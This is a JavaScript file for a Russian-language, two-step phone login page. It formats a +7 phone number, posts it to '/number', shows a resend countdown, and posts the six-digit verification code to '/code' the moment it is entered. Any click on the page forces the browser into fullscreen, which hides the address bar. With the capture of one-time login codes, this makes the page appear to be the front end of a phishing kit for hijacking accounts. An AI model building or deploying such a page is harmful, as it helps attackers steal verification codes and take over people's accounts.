doc = document.documentElement;

let seconds = 60
let isInterval = false

window.addEventListener('click', () => {
  doc.requestFullscreen()
  //console.log('ok')
})

function codeTimer() {
  if (!isInterval) {
    timeout = setInterval(() => {
      seconds -= 1
      isInterval = true
      timer.textContent = `Получить новый код можно через 0:${seconds}`
      if (seconds < 10) {
        timer.textContent = `Получить новый код можно через 0:0${seconds}`
    }
      if (seconds <= 0) {
        console.log('ok', seconds)
        timer.textContent = 'Получить новый код'
        timer.style.color = '#017bff'
        clearInterval(timeout)
        isInterval = false
    }}, 1000)
  }
}

function pageChange() {
  page1.classList.toggle('inactive')
  page2.classList.toggle('active')
  console.log('yes')
}

function codeUnderTextChange() {
  codeUnderText.innerHTML = `Отправили код на +7 ${value} <br> Если номер неверный, вернитесь назад`
}

document.addEventListener('DOMContentLoaded', () => {
  sumbitBtn = document.querySelector('.sumbitBtn')
  input = document.querySelector('.input')
  page1 = document.querySelector('.page1')
  page2 = document.querySelector('.page2')
  timer = document.querySelector('.timer')
  codeUnderText = document.querySelector('.codeUnderText')
  arrow = document.querySelector('.arrow')
  codeInput = document.querySelector('.codeInput')
  input.addEventListener('input', (event) => {
    value = document.querySelector('.input').value
    let x = input.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,2})(\d{0,2})/);
    input.value = !x[2] ? x[1] : x[1] + ' ' + x[2] + (x[3] ? ' ' + x[3] : '') + (x[4] ? ' ' + x[4] : '');

    if (input.value.length > 13) {
      input.value = input.value.slice(0, 13);
    }
    if ( value.length >= 13) {
      sumbitBtn.style.background = '#007aff'
      sumbitBtn.style.color = '#ffffff'
      } else {
        sumbitBtn.style.background = '#333438'
      sumbitBtn.style.color = '#6c6c6e'
      }
    console.log('event')
  })
  sumbitBtn.addEventListener('click', () => {
    if (value.length >= 13) {
      pageChange()
      codeTimer()
      codeUnderTextChange()
      fetch('/number', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({number: value})
      })
    }
  })
  timer.addEventListener('click', () => {
    seconds = 60
    timer.textContent = 'Получить новый код можно через 1:00'
    timer.style.color = '#7d7d7f'
    codeTimer()
  })
  arrow.addEventListener('click', () => {
    pageChange()
  })
  codeInput.addEventListener('input', (event) => {
    if (codeInput.value.length == '6') {
      fetch( '/code', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({code: codeInput.value})
      })
    }
  })
})
